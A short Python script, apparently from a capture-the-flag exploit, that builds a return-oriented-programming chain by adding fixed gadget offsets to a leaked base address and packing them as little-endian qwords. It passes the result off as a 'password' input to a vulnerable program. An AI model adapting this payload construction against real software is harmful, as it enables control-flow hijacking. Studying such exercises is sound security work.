# returns the little-endian byte string of a 16-char hex word
def le64(word_hex):
    return bytes.fromhex(word_hex)[::-1]


offsets = [
    "0x1b0",  # gadget_0_offset
    "0x1a8",  # gadget_1_offset
    "0x1a0",  # gadget_2_offset
    "0x198",  # gadget_3_offset
    "0x190",  # gadget_4_offset
]

# so the gadget chain is 4, 2, 2, 2, 2, 2, 2, 3, 1.
gadgets = [
    4,
    2,
    2,
    2,
    2,
    2,
    2,
    3,
    1,
]


def get_id(addr1, addr2):
    return b"16A"


def get_password(addr1, addr2):
    data = b''  # initialize empty byte string
    for g in gadgets:
        addr = addr1 + int(offsets[g], 16)
        addr_hex = f"{addr:016x}"  # format as 16-char hex for qword
        data += le64(addr_hex)

    return data
